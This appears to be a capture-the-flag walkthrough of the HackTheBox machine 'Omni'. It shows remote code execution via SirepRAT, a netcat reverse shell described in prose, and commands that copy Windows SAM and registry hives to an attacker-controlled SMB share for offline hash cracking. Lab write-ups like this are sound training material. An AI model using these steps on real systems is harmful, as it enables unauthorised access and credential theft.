Omni is a Windows box but with the fun twist of being a small IoT device.

## Enumeration

### Nmap

Performing an Nmap scan reveals the following ports open on the remote host.

```shell
# Nmap 7.92 scan initiated Sat Feb  5 09:05:31 2022 as: nmap -sC -sV -p- -o allnmap -v -Pn 10.10.10.204
Nmap scan report for 10.10.10.204
Host is up (0.058s latency).

Going to the site at 10.10.10.104:8080 gives us a login site for a site called "Windows Device Portal". This is good information!

Googling for "Windows Device Portal Exploit" (super complicated I know) gives us a result for a tool called [SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT).

## Exploitation

### Remote Code Execution

Using SirepRAT, we can execute code on the remote machine and receive a remote shell on the target machine!

To begin, we are going to do the tried and trusted http server hosting through Python and upload nc.exe to the victim host.

```shell
sudo python3 -m http.server 80
```

Once nc.exe is uploaded to the host we can execute and receive a reverse shell on the victim!

## User Enumeration

We all know the reason we are here, we want flags. Looking through the file system we can find the user directory and perusing through that gives the user flag.

![User Flag](https://mitchelldstein.github.io/assets/images/Omni/FlagUser.png)

This isn't the flag we are expecting.. What is this? Doing some research it seems we will need the user password to decrypt the "Password" field.

Looking into how to to get hashes from a local Windows machine I found the registry and system memory hold these passwords. We are going to skip system memory and use the SAM entry to find the hashes we desire.

Impacket-Secretsdump has a very useful `-SAM` option to parse through SAM hive entries. Perfect!

### Gathering Password Hashes

Impacket requires the SAM, security, and system registry entries for this exploit to work.

To get these to our local machine we can load up the Impacket-SmbServer and connect on the victim computer.

On the Kali machine:

```shell
$ impacket-smbserver share . -smb2support -username yo -password yo
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

On the Windows IoT machine:

```shell
net use \\10.10.14.19\share /u:yo yo
```

![Security reg](https://mitchelldstein.github.io/assets/images/Omni/Security.png)
![Hashes](https://mitchelldstein.github.io/assets/images/Omni/Hashes.png)

### Cracking Hashes

We will now use John to crack these hashes against rockyou.txt

![John](https://mitchelldstein.github.io/assets/images/Omni/John.png)

Nice! We got the password for the user "app". Using this we can finally log into the web-app side of this machine.

## Web App

With the "app" user, we can use the web-app interface to run commands. Under Processes we can find a Run Command window. We are going to repeat the reverse shell command we used before to get a reverse shell as the app user.
